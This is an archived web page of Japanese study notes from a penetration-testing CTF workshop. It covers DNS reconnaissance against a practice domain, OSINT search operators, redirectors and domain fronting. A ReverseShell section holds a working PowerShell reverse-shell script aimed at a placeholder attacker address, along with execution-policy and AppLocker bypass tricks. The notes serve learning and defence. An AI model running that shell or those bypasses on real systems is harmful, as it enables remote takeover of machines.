<!DOCTYPE html>
<html lang="ja">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>浪速セキュリティnote | Note</title>
    <meta name="description" content="浪速セキュリティnote">
    
    
    <link rel="preload" href="/note/assets/css/0.styles.ab390519.css" as="style"><link rel="preload" href="/note/assets/js/app.2f53d7c9.js" as="script"><link rel="preload" href="/note/assets/js/5.4b6140b2.js" as="script"><link rel="preload" href="/note/assets/js/2.c2c74dfd.js" as="script"><link rel="preload" href="/note/assets/js/34.79808ba8.js" as="script"><link rel="prefetch" href="/note/assets/js/10.08451095.js"><link rel="prefetch" href="/note/assets/js/11.a2347b46.js"><link rel="prefetch" href="/note/assets/js/12.1c654f2c.js"><link rel="prefetch" href="/note/assets/js/13.dcefe2dc.js"><link rel="prefetch" href="/note/assets/js/14.4901749e.js"><link rel="prefetch" href="/note/assets/js/15.0e80ac1f.js"><link rel="prefetch" href="/note/assets/js/16.c7b4605a.js"><link rel="prefetch" href="/note/assets/js/17.96db0079.js"><link rel="prefetch" href="/note/assets/js/18.50103cd8.js"><link rel="prefetch" href="/note/assets/js/19.4b357dd0.js"><link rel="prefetch" href="/note/assets/js/20.11082a0e.js"><link rel="prefetch" href="/note/assets/js/21.ac8fd873.js"><link rel="prefetch" href="/note/assets/js/22.d9e56bd3.js"><link rel="prefetch" href="/note/assets/js/23.8ebdb2eb.js"><link rel="prefetch" href="/note/assets/js/24.f58f01e7.js"><link rel="prefetch" href="/note/assets/js/25.afe4c487.js"><link rel="prefetch" href="/note/assets/js/26.a3ee34c5.js"><link rel="prefetch" href="/note/assets/js/27.ca1f8673.js"><link rel="prefetch" href="/note/assets/js/28.ddcd853b.js"><link rel="prefetch" href="/note/assets/js/29.cddcb5ec.js"><link rel="prefetch" href="/note/assets/js/3.faf42d1d.js"><link rel="prefetch" href="/note/assets/js/30.d9a235fb.js"><link rel="prefetch" href="/note/assets/js/31.e8db8c06.js"><link rel="prefetch" href="/note/assets/js/32.6286d69d.js"><link rel="prefetch" href="/note/assets/js/33.ac677d8d.js"><link rel="prefetch" href="/note/assets/js/35.af278cd0.js"><link rel="prefetch" href="/note/assets/js/36.ae5afcfe.js"><link rel="prefetch" href="/note/assets/js/37.ec517e3f.js"><link rel="prefetch" href="/note/assets/js/38.a3164ffe.js"><link rel="prefetch" href="/note/assets/js/39.1eab657c.js"><link rel="prefetch" href="/note/assets/js/4.7a95267e.js"><link rel="prefetch" href="/note/assets/js/40.c48ee892.js"><link rel="prefetch" href="/note/assets/js/41.c3ef68eb.js"><link rel="prefetch" href="/note/assets/js/42.6bec946e.js"><link rel="prefetch" href="/note/assets/js/43.5a1832a9.js"><link rel="prefetch" href="/note/assets/js/44.43c188ea.js"><link rel="prefetch" href="/note/assets/js/45.a753057b.js"><link rel="prefetch" href="/note/assets/js/46.e3dfdc23.js"><link rel="prefetch" href="/note/assets/js/47.0498fee9.js"><link rel="prefetch" href="/note/assets/js/48.04a9f39f.js"><link rel="prefetch" href="/note/assets/js/49.0dd2b613.js"><link rel="prefetch" href="/note/assets/js/50.76ea9c96.js"><link rel="prefetch" href="/note/assets/js/51.e0cc518d.js"><link rel="prefetch" href="/note/assets/js/52.665b15a8.js"><link rel="prefetch" href="/note/assets/js/53.072176e4.js"><link rel="prefetch" href="/note/assets/js/54.44d3b078.js"><link rel="prefetch" href="/note/assets/js/55.5cca3c12.js"><link rel="prefetch" href="/note/assets/js/56.0158bfbb.js"><link rel="prefetch" href="/note/assets/js/57.d11df105.js"><link rel="prefetch" href="/note/assets/js/58.b2abf0c2.js"><link rel="prefetch" href="/note/assets/js/59.0174f4e6.js"><link rel="prefetch" href="/note/assets/js/6.ccae45f6.js"><link rel="prefetch" href="/note/assets/js/60.fbb0e952.js"><link rel="prefetch" href="/note/assets/js/61.81cd01d5.js"><link rel="prefetch" href="/note/assets/js/62.e50b5e5e.js"><link rel="prefetch" href="/note/assets/js/63.fa5ccbbe.js"><link rel="prefetch" href="/note/assets/js/64.94c18e73.js"><link rel="prefetch" href="/note/assets/js/65.109cb413.js"><link rel="prefetch" href="/note/assets/js/66.0e94392c.js"><link rel="prefetch" href="/note/assets/js/67.bfcb4f3b.js"><link rel="prefetch" href="/note/assets/js/68.483ef9af.js"><link rel="prefetch" href="/note/assets/js/69.4866ebfa.js"><link rel="prefetch" href="/note/assets/js/7.b8642ad1.js"><link rel="prefetch" href="/note/assets/js/70.03d30d52.js"><link rel="prefetch" href="/note/assets/js/71.9e81c555.js"><link rel="prefetch" href="/note/assets/js/72.b0ce1bd3.js"><link rel="prefetch" href="/note/assets/js/73.698e94b9.js"><link rel="prefetch" href="/note/assets/js/74.97bff975.js"><link rel="prefetch" href="/note/assets/js/75.0de0f9a2.js"><link rel="prefetch" href="/note/assets/js/76.ecd01e38.js"><link rel="prefetch" href="/note/assets/js/77.23b5c916.js"><link rel="prefetch" href="/note/assets/js/78.dbd4dcd6.js"><link rel="prefetch" href="/note/assets/js/79.9bbc6936.js"><link rel="prefetch" href="/note/assets/js/8.3c008a46.js"><link rel="prefetch" href="/note/assets/js/80.3344c671.js"><link rel="prefetch" href="/note/assets/js/9.aa64878f.js">
    <link rel="stylesheet" href="/note/assets/css/0.styles.ab390519.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/note/" class="home-link router-link-active"><!----> <span class="site-name">Note</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/note/about.html" class="nav-link">About</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/note/about.html" class="nav-link">About</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>浪速セキュリティnote</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/note/article/20191229.html#基礎知識" class="sidebar-link">基礎知識</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/20191229.html#redirector" class="sidebar-link">redirector</a></li></ul></li><li><a href="/note/article/20191229.html#dnsの調査" class="sidebar-link">DNSの調査</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/20191229.html#domain-fronting" class="sidebar-link">domain fronting</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#dnsの調査-dns-enumeration" class="sidebar-link">DNSの調査(DNS Enumeration)</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#dns-lookup" class="sidebar-link">DNS Lookup</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#reverse-dns-lookup" class="sidebar-link">Reverse DNS Lookup</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#dns-zone-transfer" class="sidebar-link">DNS Zone Transfer</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#内部のサーバのレコードを見る" class="sidebar-link">内部のサーバのレコードを見る</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#redirectorとredirectの違い" class="sidebar-link">RedirectorとRedirectの違い</a></li></ul></li><li><a href="/note/article/20191229.html#osint" class="sidebar-link">OSINT</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/20191229.html#google-search-operator" class="sidebar-link">Google Search Operator</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#twitter-serach-operators" class="sidebar-link">Twitter Serach Operators</a></li></ul></li><li><a href="/note/article/20191229.html#reverseshell" class="sidebar-link">ReverseShell</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/article/20191229.html#powershell" class="sidebar-link">PowerShell</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#powershell-without-powershell-exe" class="sidebar-link">PowerShell without powershell.exe</a></li><li class="sidebar-sub-header"><a href="/note/article/20191229.html#restricting-powershell" class="sidebar-link">Restricting PowerShell</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="浪速セキュリティnote"><a href="#浪速セキュリティnote" class="header-anchor">#</a> 浪速セキュリティnote</h1> <p>12/29(日)に開催された<a href="https://naniwasecurity.connpass.com/event/154331/" target="_blank" rel="noopener noreferrer">浪速セキュリティ勉強会#04 #05：ペンテストCTFで学ぶサイバーセキュリティ（12月29日)<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>に参加した際のarchive</p> <h2 id="基礎知識"><a href="#基礎知識" class="header-anchor">#</a> 基礎知識</h2> <ul><li>今回は実際に攻撃するまでの偵察がメイン</li> <li><code>nc -lvnp 80</code>でlisten</li></ul> <h3 id="redirector"><a href="#redirector" class="header-anchor">#</a> redirector</h3> <ul><li>targetとattackerの間に配置して, targetと直接通信するサーバ</li> <li>これ自身を調べても本体はいない</li> <li>自分たちの安全を保証するために挟むのが一般的</li> <li>ペンテストやレッドチームもこういったところまでやる必要がある</li> <li>目的
<ul><li>自分たちをtargetから隠す</li> <li>redirectorをtakedownされても別のredirectorを立てればよい</li></ul></li></ul> <h2 id="dnsの調査"><a href="#dnsの調査" class="header-anchor">#</a> DNSの調査</h2> <h3 id="domain-fronting"><a href="#domain-fronting" class="header-anchor">#</a> domain fronting</h3> <ul><li>HTTPS接続のドメインを難読化(解析困難化)することによってインターネットの検閲やブロッキングを回避する手法</li> <li>例えば、CDNのサーバーにリフレクションサーバーを紛れ込ます手法などかある
<ul><li>ref: <a href="https://malware-log.hatenablog.com/entry/Domain_Fronting" target="_blank" rel="noopener noreferrer">Domain Fronting (まとめ)<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li> <li>最近はreputationで判断しているので, false positiveがある
<ul><li><a href="https://github.com/vysecurity/DomainFrontingLists" target="_blank" rel="noopener noreferrer">domainFrontingLists<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li><a href="https://sitereview.bluecoat.com/#/" target="_blank" rel="noopener noreferrer">WebPulse Site Review Request<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li></ul> <h3 id="dnsの調査-dns-enumeration"><a href="#dnsの調査-dns-enumeration" class="header-anchor">#</a> DNSの調査(DNS Enumeration)</h3> <ul><li><p>targetのname serverの探索</p></li> <li><p><a href="zonetransfer.me">zonetransfer.me</a>は脆弱なやられサーバ的な感じ</p></li> <li><p>nsレコードをもらってくる</p> <ul><li><code>host -t ns {targetip}</code></li></ul></li></ul> <div class="language- extra-class"><pre class="language-text"><code>~# host -t ns zonetransfer.me
zonetransfer.me name server nsztm1.digi.ninja.
zonetransfer.me name server nsztm2.digi.ninja.

</code></pre></div><ul><li>mxレコードをもらってくる
<ul><li><code>host -t mx {targetip}</code></li></ul></li></ul> <div class="language- extra-class"><pre class="language-text"><code># host -t mx zonetransfer.me
zonetransfer.me mail is handled by 0 ASPMX.L.GOOGLE.COM.
zonetransfer.me mail is handled by 10 ALT2.ASPMX.L.GOOGLE.COM.
zonetransfer.me mail is handled by 20 ASPMX4.GOOGLEMAIL.COM.
zonetransfer.me mail is handled by 10 ALT1.ASPMX.L.GOOGLE.COM.
zonetransfer.me mail is handled by 20 ASPMX5.GOOGLEMAIL.COM.
zonetransfer.me mail is handled by 20 ASPMX3.GOOGLEMAIL.COM.
zonetransfer.me mail is handled by 20 ASPMX2.GOOGLEMAIL.COM.
</code></pre></div><ul><li>相手はメールをgmailの管理サーバを使っていることがわかる</li> <li>-&gt; 標的型攻撃をする場合, googleの持っている機能はscanされてしまうこともわかる</li> <li>-&gt; malwareを作って添付しても, そもそも相手に着弾しない可能性がある</li> <li>-&gt; 着弾するかしないかは, 自分でgoogleのメールサーバを使って確認することができる</li> <li>これは他のメールサービスでも同様</li></ul> <h3 id="dns-lookup"><a href="#dns-lookup" class="header-anchor">#</a> DNS Lookup</h3> <ul><li>存在しそうなホスト名にDNSパケットを飛ばして確認する手法</li></ul> <div class="language- extra-class"><pre class="language-text"><code>for name in $(cat /usr/share/dnsenum/dns.txt); do
host ${name}. zonetransfer.me | grep &quot;has address&quot; | cut -d &quot; &quot; -f 1,4
done
</code></pre></div><h3 id="reverse-dns-lookup"><a href="#reverse-dns-lookup" class="header-anchor">#</a> Reverse DNS Lookup</h3> <ul><li>1つ存在しているホスト名を見つけ, 存在しているホスト名の近くを使っていると想定して上でBruteForceを試す手法</li> <li>192.168.33.{brute force}</li></ul> <h3 id="dns-zone-transfer"><a href="#dns-zone-transfer" class="header-anchor">#</a> DNS Zone Transfer</h3> <ul><li>ゾーン転送情報取得を用いて確認する手法</li> <li>dig axfr @... addr</li></ul> <h3 id="内部のサーバのレコードを見る"><a href="#内部のサーバのレコードを見る" class="header-anchor">#</a> 内部のサーバのレコードを見る</h3> <ul><li>サーバ証明書を発行した時に発行した旨をDBに蓄積する</li> <li>これが改ざんされていないかを確認する仕組みがある
<ul><li><a href="https://www.jnsa.org/seminar/pki-day/2016/data/1-2_oosumi.pdf" target="_blank" rel="noopener noreferrer">【講演】Certificate Transparencyを知ろう ～証明書の透明...<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li> <li>このログサーバは公開されている
<ul><li>内部のサーバレコードが見れる</li> <li>命名から中身が想定できる</li></ul></li> <li><a href="https://github.com/Edu4rdSHL/findomain" target="_blank" rel="noopener noreferrer">findomain<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul> <h3 id="redirectorとredirectの違い"><a href="#redirectorとredirectの違い" class="header-anchor">#</a> RedirectorとRedirectの違い</h3> <ul><li>redirectorは直接通信する</li> <li>redirectは挟んで通信するので遮断される可能性がある</li></ul> <h2 id="osint"><a href="#osint" class="header-anchor">#</a> OSINT</h2> <h3 id="google-search-operator"><a href="#google-search-operator" class="header-anchor">#</a> Google Search Operator</h3> <ul><li><a href="http://www.googleguide.com/print/adv_op_ref.pdf" target="_blank" rel="noopener noreferrer">GoogleGuide making searching even easier<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li>空白はOR</li> <li><code>-</code>は除外</li> <li><code>site:</code></li> <li><code>filetype:</code> <ul><li><code>filetype:pdf</code>が便利</li></ul></li></ul> <h3 id="twitter-serach-operators"><a href="#twitter-serach-operators" class="header-anchor">#</a> Twitter Serach Operators</h3> <ul><li><a href="https://developer.twitter.com/en/docs/tweets/rules-and-filtering/overview/standard-operators" target="_blank" rel="noopener noreferrer">Rules and filtering<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li><code>geocode: 緯度,経度,距離km</code></li> <li><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener noreferrer">google hacking database<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li>社内向け資料に連絡先があるなど</li></ul> <h2 id="reverseshell"><a href="#reverseshell" class="header-anchor">#</a> ReverseShell</h2> <h3 id="powershell"><a href="#powershell" class="header-anchor">#</a> PowerShell</h3> <ul><li>PowerShellでファイルを実行するにはExecutionPolicyを設定し直す必要がある
<ul><li><a href="https://qiita.com/kikuchi/items/59f219eae2a172880ba6" target="_blank" rel="noopener noreferrer">設定値等についてはこちら(Qiita: PowerShellのExecutionPolicyのスコープとかについて詳しく)<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li></ul> <div class="language- extra-class"><pre class="language-text"><code>Set-ExecutionPolicy bypass`
start-process calc.exe
powershell.exe -executionpolicy bypass gen_calc.ps1
</code></pre></div><ul><li>ReverseShell用のCSharpCode</li></ul> <div class="language- extra-class"><pre class="language-text"><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;attackerAddress&quot;,443);
$stream =$client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback =(iex $data 2&gt;&amp;1 | Out-String );
  $sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;
  $sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};

$client.Close()
</code></pre></div><h3 id="powershell-without-powershell-exe"><a href="#powershell-without-powershell-exe" class="header-anchor">#</a> PowerShell without powershell.exe</h3> <ul><li>SyncAppvは仮想化モジュールの一部</li> <li>powershellのコマンドを受け付ける
<ul><li><code>C:\Windows\System32\SyncAppvPublishingServer.vbs &quot;Break; start-process calc.exe&quot;</code></li> <li>これでcalc.exeが立ち上がる</li></ul></li> <li>lolbas(Living Off The Land Binaries and Scripts)
<ul><li>現地調達型バイナリ(実行ファイル)</li> <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">Web: Living Off The Land Binaries and Scripts (and also Libraries)<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li><a href="https://github.com/LOLBAS-Project/LOLBAS" target="_blank" rel="noopener noreferrer">GitHub<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li>ここで対象になっている107個のアプリケーションはチェック対象にすることが求められる</li></ul></li></ul> <h3 id="restricting-powershell"><a href="#restricting-powershell" class="header-anchor">#</a> Restricting PowerShell</h3> <ul><li>applocker
<ul><li>ブラックリスト管理をするのが良い</li> <li>最初に全て許可してからダメなものをブラックリストに入れる</li></ul></li> <li>apploockerのbypass
<ul><li>powershellを動かせる</li> <li>対策として, InstallUtil.exeをapplockerに入れる
<ul><li>その際に, 過去の実行ログをみて, 使われていない場合は良いかもしれない</li> <li>だいたい使われているので, それらを使っているcallerをホワイトリスト管理するとよい</li></ul></li></ul></li></ul></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2019-12-29 15:09:09</span></div></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/note/assets/js/app.2f53d7c9.js" defer></script><script src="/note/assets/js/5.4b6140b2.js" defer></script><script src="/note/assets/js/2.c2c74dfd.js" defer></script><script src="/note/assets/js/34.79808ba8.js" defer></script>
  </body>
</html>
